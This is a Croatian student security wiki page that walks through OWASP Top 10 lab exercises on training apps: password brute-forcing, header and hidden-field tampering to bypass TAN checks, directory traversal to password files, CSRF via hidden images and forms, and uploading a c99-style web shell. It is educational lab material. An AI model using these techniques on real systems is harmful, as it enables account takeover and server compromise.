+<p><br />
+Još jedan mogući način zaobilaženja provjere korisnika je i jednostavan bruteforce napad, koji jednostavno isprobava sve moguće kombinacije, u lošijoj varijanti, dok u boljoj varijanti koristi rječnik često korištenih lozinki.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_fireforce_brute.jpg" class="image"><img alt="Auth fireforce brute.jpg" src="../images/thumb/a/a9/Auth_fireforce_brute.jpg/800px-Auth_fireforce_brute.jpg" width="800" height="450" /></a></div></div>
+<p><br />
+Takav napad ima određene nedostatke, poput generiranja velikog broja upita prema poslužitelju koje je relativno lako uočiti te blokirati adresu koja šalje takve upite. Za demonstriranje takvog napada opet je korišten xampp server na kojem se nalazila  mutillidae, te ovaj put umjesto mantre običan Mozilla Firefox sa dodanom Fireforce ekstenzijom. Ta ekstenzija omogućava traženje lozinke za korisnička imena, bilo korištenjem rječnika ili raznim kombinacijama slova i brojeva. Korištenje rječnika je puno efikasniji i brži način napada. Za potrebe demonstracije korišten je manji rječnik sa samo 16 zapisa. Također je važno pogoditi dobar odgovor poslužitelja na pogrešan unos.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_fireforce_rjecnik.JPG" class="image"><img alt="Auth fireforce rjecnik.JPG" src="../images/f/f6/Auth_fireforce_rjecnik.JPG" width="746" height="301" /></a></div></div>
+<p><br />
+Nakon provjere rječnika Fireforce ekstenzija dolazi do točne lozinke, naravno ukoliko se ona nalazi u rječniku, ukoliko je nema javlja samo poruku da lozinka nije pronađena.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_fireforce_prosao.JPG" class="image"><img alt="Auth fireforce prosao.JPG" src="../images/e/ec/Auth_fireforce_prosao.JPG" width="788" height="302" /></a></div></div>
+<p><br />
+Naravno jednostavnom provjerom pronađene lozinke dobiva se pristup sustavu, naravno sa administratorskim privilegijama jer je ciljan točno taj korisnički račun.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_logged_in.JPG" class="image"><img alt="Auth logged in.JPG" src="../images/thumb/a/a5/Auth_logged_in.JPG/800px-Auth_logged_in.JPG" width="800" height="97" /></a></div></div>
+<pre>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 00:42, 6. siječnja 2012. (CET)
+</pre>
+<h4> <span class="mw-headline" id="Webgoat_lekcije_3"> <b>Webgoat lekcije</b> </span></h4>
+<h5> <span class="mw-headline" id="Lekcija_1-_Ja.C4.8Dina_passworda"><b>Lekcija 1- Jačina passworda</b></span></h5>
+<p>Jačina passworda je bitna, jer može napadaču uvelike otežati posao, ukoliko pokušava provaliti naš password, te se ne kaže uzalud da je naš account jak onoliko koliko je jak naš password. Ako uzmemo da nam je password <i>abzfez</i> i stavimo ga u secret code checker, vidimo da je password slab i da je potrebno samo 1394 sekunde, ili oko 23 minute da ga se probije. Na slici ispod vidimo različite tipove passworda i koliko je otprilike potrebno vremena da ih se probije. Vidimo da je password, koji sadrži mala i velika slova, brojke i specijalne znakove, najteže probiti. Tako da se probije  password <i>z8!E?7</i> treba otprilike 41 dan.  To nas dovodi da zaključka da password treba biti što duži, da treba sadržavati i specijalne znakove i potrebno je biti lako pamtljiv.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss1.GIF" class="image"><img alt="Ss1.GIF" src="../images/5/57/Ss1.GIF" width="563" height="376" /></a></div></div> <br />
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 16:44, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h5> <span class="mw-headline" id="Lekcija_2-_Povratak_passworda"><b> Lekcija 2- Povratak passworda</b></span></h5>
+<p>Gotovo svaka web stranica nudi mogućnost povratka izgubljenog passworda, ali je problem u tome što na većini tih stranica mehanizam koji to radi nije pravilno implementiran. Zbog toga je dosta jednostavno doći do passworda ostalih korisnika te manipulirati njihovim accountom. Na sljedećim slikama vidjet ćemo kako mehanizam radi i kako je loše implementiran.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss21.GIF" class="image"><img alt="Ss21.GIF" src="../images/8/84/Ss21.GIF" width="561" height="345" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss22.GIF" class="image"><img alt="Ss22.GIF" src="../images/3/39/Ss22.GIF" width="562" height="321" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss23.GIF" class="image"><img alt="Ss23.GIF" src="../images/7/7f/Ss23.GIF" width="564" height="309" /></a></div></div>
+<p>Na prvoj slici se traži da upišemo naš username, koji je u ovom slučaju webgoat, nakon što stisnemo na submit, prelazimo na stranicu gdje nas se traži da upišemo svoju najdražu boju, u ovom slučaju je naša najdrža boja je crvena. Odgovor na to pitanje odabiremo prilikom kreiranja accounta. Neke varijacije tih pitanja su <i>Koji je naš najdraži učitelj?</i>, K<i>oja je naša najdraža grupa?</i>.  Nakon što smo točno odgovorili na to pitanje, dobivamo password pomoću kojeg se možemo logirati. 
+Sada to isto možemo probati sa nekim drugim korisnikom, na primjer adminom sustava. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss24.GIF" class="image"><img alt="Ss24.GIF" src="../images/f/fe/Ss24.GIF" width="562" height="350" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss25.GIF" class="image"><img alt="Ss25.GIF" src="../images/4/45/Ss25.GIF" width="563" height="327" /></a></div></div>
+<p>Nakon što smo pritisnuli submit, prebacuje nas na stranicu gdje nas pita koja je najdraža boja, te upisivajući različite boje naposljetku ćemo pogoditi pravu boju koja će nas odvesti do passworda koji ima admin.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss26.GIF" class="image"><img alt="Ss26.GIF" src="../images/a/a8/Ss26.GIF" width="561" height="343" /></a></div></div>
+<p>Na ovoj slici smo došli do passworda admina, a ako smo to na takav lagan način uspjeli napraviti, znači da je mehanizam loš i da je sve na toj stranici ugroženo. Moguća rješenja su da se svakom useru koji se registrira ponudi izbor odabira više pitanja, a ne na samo jedno ili da mu se ponudi mogućnost da napiše vlastito pitanje i odgovor. Još jedna od mogućnosti je da mu se password vrati na broj mobilnog telefona ili na neki drugi e-mail, a ne direktno, kao u ovom slučaju. <br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 16:50, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h5> <span class="mw-headline" id="Lekcija_3-_Provjera_autenti.C4.8Dnosti"><b> Lekcija 3- Provjera autentičnosti</b></span></h5>
+<p>Provjera autentičnosti služi kako bi se zaštitili resursi na serveru, odnosno da bi se zabranio pristup onima koji nemaju pravo pristupa serveru i resursima na serveru. Također, ovo je moguće zaobići ako mehanizam nije dobro implementiran, te se u nastavku pokazuje kako. <br />
+Prvo što nas ova lekcija traži je da upišemo ime <i>authentication headera</i> i vrijednost tog headera. Za ovu lekciju nam treba <b>WebScarab</b>, ili slični programi, koji nam pomažu da prihvaćamo sve pakete koji idu od servera i korisnika. Prvo što treba napraviti je pokrenuti WebScarab i omogućiti presretanje paketa. Nakon što smo to napravili pritisnemo submit i presretnemo paket.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss31.GIF" class="image"><img alt="Ss31.GIF" src="../images/b/bc/Ss31.GIF" width="560" height="341" /></a></div></div>
+<p>Paket koji smo presreli vidimo na slici ispod, te iz njega pronađemo header koji trebamo kako bi smo lekciju nastavili dalje. Taj header se zove Authorization i ima svoju vrijednost koja je kriptirana sa base64 encode. Ime headera upišemo u polje gdje se to traži, vrijednost tog headera moramo dekriptirati sa base64 decode.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss32.GIF" class="image"><img alt="Ss32.GIF" src="../images/f/f0/Ss32.GIF" width="802" height="601" /></a></div></div>
+<p>WebScarab u sebi ima taj decoder pa ga ja samo potrebno pokrenuti i pomoću njega dekodirati vrijednost headera Authorization. Kad ga dekodiramo dobijemo vrijednost <i>guest:guest</i> koji nam u ovom slučaju predstavlja username i password kojim smo trenutno prijavljeni.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss34.GIF" class="image"><img alt="Ss34.GIF" src="../images/e/e9/Ss34.GIF" width="600" height="399" /></a></div></div>
+<p>Kad smo upisali vrijednost headera Authoriztion, prvi korak je gotov i WebGoat nam javlja da smo prvi korak uspješno rješili i da sad razumijemo kako autentikacija funkcionira. Sada je potrebno proći korak 2, koji nam kaže da nas server mora autenticirati kao basic:basic, odnosno da smo prijavljeni kao korisnik basic sa passwordom basic.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss35.GIF" class="image"><img alt="Ss35.GIF" src="../images/e/e6/Ss35.GIF" width="562" height="385" /></a></div></div>
+<p>Prvi korak koji je potreban napravit je brisanje cachea i cookiesa, kako je nebi, kad ponovno kliknemo na tu vježbu, vadio je iz cachea, te kako bi obrisali cookie za prethodni session, jer prvo što se provjerava kod ponovnog učitavanja stranice je cookie. <br />
+Nako što smo obrisali cookie i cache, ponovno uključimo interception kako bi presreli pakete. Sada trebamo uvjeriti server da smo prijavljeni kao basic:basic. Učitamo ponovno stranicu, te iz paketa koji smo presreli tražimo headere Cookie i Authorization. Vidimo headera Cookie nemamo jer smo ga obrisali u web pregledniku. Kako nema headera Cookie, sljdeće što server gleda je header Authorization, koji se nalazi u ovom paketu i koji ima vrijednost guest:guest. Mi ne želimo da smo prijavljeni kao guest:guest, već želimo uvjeriti server da smo <i>basic:basic</i>. <br />
+Sljedeće što trebamo napraviti je corrupt vrijednosti Authorization, a to možemo napraviti izravno u WebScarabu. Vrijednost headera Authorization izmjenimo i kliknemo na accept changes kako bi takav paket poslali serveru. Server prima taj paket i vidi da nema Cookiea i da header Authorization nema valjanu vrijednost.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss38.GIF" class="image"><img alt="Ss38.GIF" src="../images/1/13/Ss38.GIF" width="801" height="602" /></a></div></div>
+<p>Server nam onda šalje login screen i od nas traži username i password. Želimo se prijaviti kao basic:basic. Nakon pritiska na login presretnemo paket koji se šalje serveru.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss39.GIF" class="image"><img alt="Ss39.GIF" src="../images/3/34/Ss39.GIF" width="357" height="219" /></a></div></div>
+<p>Vidimo da paket još nema header Cookie jer još nije kreiran, a header Authorization ima različitu vrijednost nego prije.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss310.GIF" class="image"><img alt="Ss310.GIF" src="../images/9/9d/Ss310.GIF" width="798" height="600" /></a></div></div>
+<p>Kada tu vrijednost dekodiramo, dobijemo da header Authorization ima vrijednost basic:basic, što i želimo.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss311.GIF" class="image"><img alt="Ss311.GIF" src="../images/d/d8/Ss311.GIF" width="601" height="398" /></a></div></div>
+<p>Kada ponovno učitamo lekciju, dobivamo porku da je lekcija uspješno završena i da smo uspjeli prevariti server i spojiti se kao basic:basic.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss313.GIF" class="image"><img alt="Ss313.GIF" src="../images/0/02/Ss313.GIF" width="562" height="284" /></a></div></div> <br />
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 17:27, 5. siječnja 2012. (CET)
+</p>
+<h5> <span class="mw-headline" id="Lekcija_4-_Vi.C5.A1e_razina_prijave_-_1_dio"><b> Lekcija 4- Više razina prijave - 1 dio</b></span></h5>
+<p>Više razina prijave nam omogućavaju jaču zaštitu, a funkcionira tako da nakon što se prijavimo u sustav, prijavu moramo potvrditi sa nekim brojem koji nam daje poduzeće na čiju se stranicu prijavljujemo. Paralelu možemo povući sa bankama i internet bankarstvo, gdje nakon što se prijavimo ili prilikom prijave, pomoću tokena ili na neki drugi način dobivamo TAN(Transaction Authentication Number) broj koji nam generira banka, kako bi potvrdili da smo to mi. Ipak ova lekcija nam pokazuje da je i takvu zaštitu, unatoč što je dosta jaka, moguće probiti.
+Zadatak ima 2 koraka koja treba prijeći da bi se lekcija uspješno završila. Prvi korak je klasični login gdje se potrebno logirati kao <b>Jane</b> sa passwordom <b>tarzan</b>.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss41.GIF" class="image"><img alt="Ss41.GIF" src="../images/d/d7/Ss41.GIF" width="566" height="573" /></a></div></div>
+<p>Nakon što smo se logirali, potrebno je upisati TAN kako bi potvrdili da smo to mi.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss42.GIF" class="image"><img alt="Ss42.GIF" src="../images/c/cb/Ss42.GIF" width="562" height="576" /></a></div></div>
+<p>Nakon što smo to sve obavili uspješno smo se logirali i dobili podatke koje smo trebali. Sada pretpostavljamo da smo prilikom logina bili pod napadom hakera koji je uspio ukrasti naš username i password i TAN. Sada se stavljamo u poziciju hakera i pokušavamo se spojiti kao Jane kako bi uzeli njezin broj  kreditne kartice.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss43.GIF" class="image"><img alt="Ss43.GIF" src="../images/3/3a/Ss43.GIF" width="560" height="564" /></a></div></div>
+<p>Nako što smo se logirali sa podacima od Jane, sustav nas traži TAN broj, a mi imamo samo TAN sa kojim se Jane prvi put spojila, te ako upišemo taj TAN, nećemo se uspjeti prijaviti. Zbog toga ponovno uključjemo WebScarab i omogućavamo intecept paketa. Kada nas sustav traži da unesemo TAN broj, upišemo neki random broj i klikemom submit.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss44.GIF" class="image"><img alt="Ss44.GIF" src="../images/c/cb/Ss44.GIF" width="564" height="531" /></a></div></div>
+<p>WebScarab će taj paket presresti i omogućiti manipulaciju sa njime. Na slici vidimo komandu <i>„hidden_tan=2&amp;tan=44676&amp;Submit=Submit“</i>.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss46_1.gif" class="image"><img alt="Ss46 1.gif" src="../images/4/4b/Ss46_1.gif" width="797" height="599" /></a></div></div>
+<p>Kako nam WebScarab omogućuje manipulaciju tim podacima, hidden_tan postavimo da je jedan i vrijednost TAN-a postavimo kao 15648 što je vrijednost TAN-a koju je unijela Jane kad smo joj ukrali podatke. To vidimo na slici ispod.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss46_2.GIF" class="image"><img alt="Ss46 2.GIF" src="../images/d/d5/Ss46_2.GIF" width="606" height="321" /></a></div></div>
+<p>Nakon toga kliknemo na Accept changes, te takav paket pošaljemo serveru koji nas pušta u sustav kao Jane i tako smo uspjeli doći do broja kreditne kartice od Jane.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss47.GIF" class="image"><img alt="Ss47.GIF" src="../images/3/3f/Ss47.GIF" width="563" height="561" /></a></div></div>
+<p>Ovdje je vidljivo da mehanizam nije dobro implementiran jer je uvelike vezan za korisničko ime i ukradenim korisničkim imenom smo praktički dobili sve, te se uz malo više truda da hakirati korisnički račun. Zagrebačka banka je to rješila na način, koji smatram da je bolji, da je username broje tokena, a password je TAN broj koji se dobije pomoću tokena. U ovom slučaju password je svaki put drugačiji i ne ponavlja se što napadaču uvelike otežava posao.<br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 17:36, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h5> <span class="mw-headline" id="Lekcija_4-_Vi.C5.A1e_razina_prijave_-_2_dio"><b> Lekcija 4- Više razina prijave - 2 dio</b></span></h5>
+<p>Ova vježba je slična kao i prva vježba. Ovdje smo mi napadač koji ima račun u banci, te se pokušavamo spojiti na račun od Jane koja isto ima račun u banci u kojoj smo mi.
+Prvo što napravimo je login sa svojim korisničkim imenom i passwordom.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss51.GIF" class="image"><img alt="Ss51.GIF" src="../images/c/cf/Ss51.GIF" width="561" height="571" /></a></div></div>
+<p>Nakon logina potrebno je unoseti TAN broj.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss52.GIF" class="image"><img alt="Ss52.GIF" src="../images/a/ae/Ss52.GIF" width="564" height="581" /></a></div></div>
+<p>Nakon unešenog ispravnog TAN broja, prijava je uspjela, te možemo vidjeti svoje podatke.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss53.GIF" class="image"><img alt="Ss53.GIF" src="../images/e/e8/Ss53.GIF" width="563" height="583" /></a></div></div>
+<p>Sada se pomoću tih podataka moramo spojiti kao korisnik Jane. Prvo se spojimo na svoj account, kada se spojimo, sustav nas traži TAN broj i to TAN broj 2, jer je prvi iskorišten. Sada uključujemo WebScarab kako bi presreli pakete, te kliknemo na submit.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss54.GIF" class="image"><img alt="Ss54.GIF" src="../images/7/75/Ss54.GIF" width="561" height="575" /></a></div></div>
+<p>TAN broj može biti naš pravi TAN#2, ali može biti i neki radnom broj. U ovom slučaju uneđen je random broj. Klikom na submit, presrećemo paket i možemo sa njim manupulirati. Kao i u prethodnom slučaju, manipuliramo naredbom <i>„hidden_user=Joe&amp;tan2=6756&amp;Submit=Submit“</i>, što se vidi na slici.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss55_1.gif" class="image"><img alt="Ss55 1.gif" src="../images/1/13/Ss55_1.gif" width="802" height="600" /></a></div></div>
+<p>Hidden_user promjenim na Jane, a tan2 promjenim na 4894, koji je tan od Joe-a, kliknemo na Accept changes, nam se pokazuju podaci od Jane, te smo tako uspjeli hakirati njezin račun.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss56_1.gif" class="image"><img alt="Ss56 1.gif" src="../images/9/94/Ss56_1.gif" width="804" height="600" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss57.GIF" class="image"><img alt="Ss57.GIF" src="../images/1/12/Ss57.GIF" width="563" height="610" /></a></div></div> <br />
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 18:51, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Insecure_direct_object_references_.28A4.29"> <b>Insecure direct object references (A4)</b> </span></h3>
+<p>Ranjivost koja se javlja kada neki dio referenciranja ostane izložen odnosno javno dostupan, te se preko njega onda može pristupiti neki internim objektima kojima možda u osnovi ne bi trebao biti dopušten pristup. Ovu ranjivost također je moguće demonstrirati korištenjem OWASP mantra-e, mutillidae i xampp-a. Tako unutar mutillidae postoji dio koji služi za demonstriranje ove slabosti i to je stranica koja prikazuje kod web stranica ponuđenih unutar padajućeg izbornika. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Idor_source_viewer.JPG" class="image"><img alt="Idor source viewer.JPG" src="../images/thumb/5/53/Idor_source_viewer.JPG/800px-Idor_source_viewer.JPG" width="800" height="210" /></a></div></div>
+<p><br />
+Korištenjem mantra-e, odnosno preciznije Live HTTP headers ekstenzije prilikom pregledavanja izvornog koda moguće je vidjeti detalje samih zaglavlja koja se razmjenjuju između poslužitelja i korisnika. Na slici možemo vidjeti zaglavlje sa zahtjevom koji odlazi od korisnika prema poslužitelju.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Idor_live_http_headers.JPG" class="image"><img alt="Idor live http headers.JPG" src="../images/2/2a/Idor_live_http_headers.JPG" width="750" height="501" /></a></div></div>
+<p><br />
+Analizom zaglavlja moguće je uočiti informacije koje se prenose, te je moguće uočiti da se u zaglavljima prenosi i naziv dokumenta koji se prikazuje unutar preglednika. Pošto se unutar zaglavlja prenosi i naziv korištenjem Live HTTP headers moguće je modificirati zahtjeve te ih tako modificirane ponovo slati poslužitelju. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Idor_live_http_replay.JPG" class="image"><img alt="Idor live http replay.JPG" src="../images/8/8b/Idor_live_http_replay.JPG" width="600" height="501" /></a></div></div>
+<p><br />
+Tako je moguće dobiti na uvid stranice koje se nisu nalazile u padajućem izborniku, uključujući i konfiguracijske datoteke koje se nalaze na poslužitelju, kao na primjer config.inc. Isto tako uz malo eksperimentiranja i kopanja moguće je uz kretanje po poslužitelju doći do datoteke koja sadrži osnovne lozinke, što se može vidjeti na sljedećoj slici.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Idor_uhvacen_pass.JPG" class="image"><img alt="Idor uhvacen pass.JPG" src="../images/thumb/4/4e/Idor_uhvacen_pass.JPG/800px-Idor_uhvacen_pass.JPG" width="800" height="472" /></a></div></div>
+<pre>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 00:42, 6. siječnja 2012. (CET)
+</pre>
+<p><br />
+</p>
+<h3> <span class="mw-headline" id="Cross_Site_Request_Forgery_.28A5.29"> <b>Cross Site Request Forgery (A5)</b> </span></h3>
+<p>Ova ranjivost omogućava napadaču da pošalje zahtjev sa web preglednika žrtve. Pošto ne postoji način da poslužitelj zna koja osoba je točno poslala zahtjev (može samo znati sa kojeg preglednika je poslan) on podrazumijeva da je poslan od strane žrtve te tako napadač u svome lažnom zahtjevu može koristiti i cookie koji se zapravo nalazi kod žrtve. Za demonstriranje ove slabosti opet je korišten xampp, OWASP mantra, mutillidae i za još jedan pristup DVWA. Još jednu stvar koja se koristi je jednostavna php stranica koja će služiti za generiranje lažnih zahtjeva. Kod oba tipa napada pretpostavlja se da je žrtva prijavljena na stranice kojima se šalju lažni zahtjevi. U prvom pak pristupu još i pretpostavljamo da su podaci žrtve poznati, uključujući i samu lozinku, te samo demonstrira princip. Tako kod prvog pristupu žrtva samo treba posjetiti zaraženu stranicu (u ovom slučaju web mjesto PhpSandy, stranica indeks.php), na toj stranici se nalazi skrivena slika veličine jednog pixela koja kao svoj src parametar ima zahtjev koji želimo da žrtva pošalje, u ovom slučaju zahtjev za promjenom lozinke žrtve. Sam zahtjev je GET tipa tako da ga je lako ubaciti i formulirati prema potrebi. Na samoj stranici slika se ne vidi pa žrtva ne primjećuje da slika postoji i da se nije učitala.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_evilmod_site.JPG" class="image"><img alt="Csrf evilmod site.JPG" src="../images/d/d6/Csrf_evilmod_site.JPG" width="396" height="172" /></a></div></div>
+<p><br />
+Izvorni kod same stranice prilično je jednostavan, jedini dio koji je važan je sama slika skrivena na stranici.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_evilmod_site_code.JPG" class="image"><img alt="Csrf evilmod site code.JPG" src="../images/b/bd/Csrf_evilmod_site_code.JPG" width="911" height="240" /></a></div></div>
+<p><br />
+Nakon što je žrtva naletjela na stranicu neće biti nikakve indikacije da se nešto desilo, prva naznaka da je nešto pošlo po krivu je kada se žrtva ponovo pokuša prijaviti te shvati da lozinka ne odgovara.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_loginfail.JPG" class="image"><img alt="Csrf loginfail.JPG" src="../images/8/85/Csrf_loginfail.JPG" width="456" height="381" /></a></div></div>
+<p><br />
+Kod drugog pristupa pretpostavlja se još jedna dodatna razina društvenog inženjeringa jer se temelji na tome da je žrtva dovoljno naivna da klikne gumb te tako zapravo pošalje zamaskirani POST zahtjev. Na samoj stranici nalazi se skriven formular koji se popunjen šalje poslužitelju i u ovom slučaju postavlja nov zapis na blog žrtve. Pošto se zahtjeva da žrtva sama klikne na element stranice u ovom slučaju na stranici se nalazi gumb koji bi trebao navesti žrtvu da ga klikne.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_evilmod_blog.JPG" class="image"><img alt="Csrf evilmod blog.JPG" src="../images/f/f6/Csrf_evilmod_blog.JPG" width="399" height="145" /></a></div></div>
+<p><br />
+Izvorni kod same stranice opet nije pretjerano kompliciran i važan dio koda je skriveni formular koji sadrži podatke koje napadač želi poslati kroz web preglednik žrtve. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_evilmod_blog_code.JPG" class="image"><img alt="Csrf evilmod blog code.JPG" src="../images/5/57/Csrf_evilmod_blog_code.JPG" width="1045" height="300" /></a></div></div>
+<p><br />
+Rezultat koji se postigne kada logirani korisnik klikne gumb na stranici se može vidjeti na sljedećoj slici.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf_ubaceno_blog.JPG" class="image"><img alt="Csrf ubaceno blog.JPG" src="../images/thumb/2/2e/Csrf_ubaceno_blog.JPG/600px-Csrf_ubaceno_blog.JPG" width="600" height="154" /></a></div></div>
+<pre>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 00:42, 6. siječnja 2012. (CET)
+</pre>
+<p><br />
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Security_Misconfiguration_.28A6.29"><b>Security Misconfiguration (A6)</b> </span></h3>
+<p><br />
+Pogrešno ili nedovoljno dobro uređene opcije mogu biti opasne za sustav. Npr. kao što ćemo pokazati dovoljno je imati samo jednu formu za upload datoteka koja ne provjerava format i može se u potpunosti preuzeti kontrola nad cijelim računalom/serverom, a ne samo web aplikacijom. Problem kod upload-a je što napadač mora pronaći samo jednu ovakvu formu koja nije zaštićena, i ovisno o lokaciji gdje je file spremljen, treba pronaći i pokrenuti datoteku. Kako bi se izbjegle štetne posljedice za sustav, trebalo bi svaki upload provjeravati sa antivirusnim programima, provjeravati zaglavlja slika, dvostruke ekstenzije, napraviti provjeru unosa, blokirati zabranjene ekstenzije, te štititi folder u koji se spremaju uploadane datoteke. 
+<br />
+Za početak, pokušali smo uploadati sliku kao što i piše (forma za upload je namijenjena uploadu slika).
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Jpg_je_prosao.PNG" class="image"><img alt="Jpg je prosao.PNG" src="../images/a/a7/Jpg_je_prosao.PNG" width="670" height="186" /></a></div></div>
+<p><br />
+Budući da je JPG format prošao, zašto ne pokušati još neke formate? Tako smo uspjeli uploadati i sql format:
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Baza.PNG" class="image"><img alt="Baza.PNG" src="../images/e/e1/Baza.PNG" width="670" height="154" /></a></div></div>
+<p><br />
+PNG format sa kodom u komentarima:
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Kod_u_slici.PNG" class="image"><img alt="Kod u slici.PNG" src="../images/7/79/Kod_u_slici.PNG" width="1162" height="549" /></a></div></div>
+<p><br />
+datoteku sa dvostrukom ekstenzijom:
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:C100.PNG" class="image"><img alt="C100.PNG" src="../images/2/23/C100.PNG" width="902" height="732" /></a></div></div>
+<p><br />
+i na kraju "evil" skriptu c99.php (ovdje sismis.php (sa drugačijim MD5 hash-om)):
+</p><p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sismis.PNG" class="image"><img alt="Sismis.PNG" src="../images/7/76/Sismis.PNG" width="897" height="735" /></a></div></div>
+<p><br />
